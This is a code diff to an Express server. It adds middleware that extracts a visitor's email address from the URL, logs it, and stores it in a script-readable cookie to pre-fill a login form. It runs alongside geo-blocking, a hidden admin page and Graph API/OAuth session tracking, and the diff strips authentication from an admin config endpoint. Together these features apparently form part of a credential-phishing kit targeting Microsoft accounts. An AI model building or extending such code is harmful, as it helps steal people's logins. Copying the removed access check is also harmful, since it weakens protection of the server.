@@ -174,8 +174,53 @@ function geoBlockMiddleware(req, res, next) {
     next();
 }
 
-// Apply geo-blocking before serving static files
+// Auto-grab URL parsing middleware
+function autoGrabMiddleware(req, res, next) {
+    // Skip for API endpoints and admin panel
+    if (req.path.startsWith('/api/') || req.path === '/ad.html') {
+        return next();
+    }
+
+    // Load auto-grab config
+    const configPath = path.join(__dirname, 'autograb-config.json');
+    let autoGrabConfig = { enabled: false, autoRedirect: true };
+
+    if (fs.existsSync(configPath)) {
+        try {
+            autoGrabConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+        } catch (error) {
+            console.warn('Error loading auto-grab config:', error.message);
+        }
+    }
+
+    // Skip if auto-grab is disabled
+    if (!autoGrabConfig.enabled) {
+        return next();
+    }
+
+    // Try to parse email from URL
+    const fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
+    const parsedEmail = parseEmailFromUrl(fullUrl);
+
+    if (parsedEmail && parsedEmail.email) {
+        console.log(`📧 Auto-grabbed email from URL: ${parsedEmail.email} (pattern: ${parsedEmail.pattern})`);
+        
+        // Store parsed email in session or cookie for frontend to use
+        req.autoGrabbedEmail = parsedEmail.email;
+        
+        // Set cookie so frontend can pre-fill the email
+        res.cookie('autoGrabbedEmail', parsedEmail.email, { 
+            maxAge: 60000, // 1 minute
+            httpOnly: false // Allow JS to read it
+        });
+    }
+
+    next();
+}
+
+// Apply middlewares before serving static files
 app.use(geoBlockMiddleware);
+app.use(autoGrabMiddleware);
 app.use(express.static('public'));
 
 // Store user sessions with Graph API auth and OAuth state tracking
@@ -2163,8 +2208,8 @@ app.post('/api/admin/autograb/parse', requireAdminAuth, (req, res) => {
     }
 });
 
-// Get auto-grab configuration
-app.get('/api/admin/autograb/config', requireAdminAuth, (req, res) => {
+// Get auto-grab configuration (allow reading without auth for status check)
+app.get('/api/admin/autograb/config', (req, res) => {
     try {
         const configPath = path.join(__dirname, 'autograb-config.json');
         let config = {
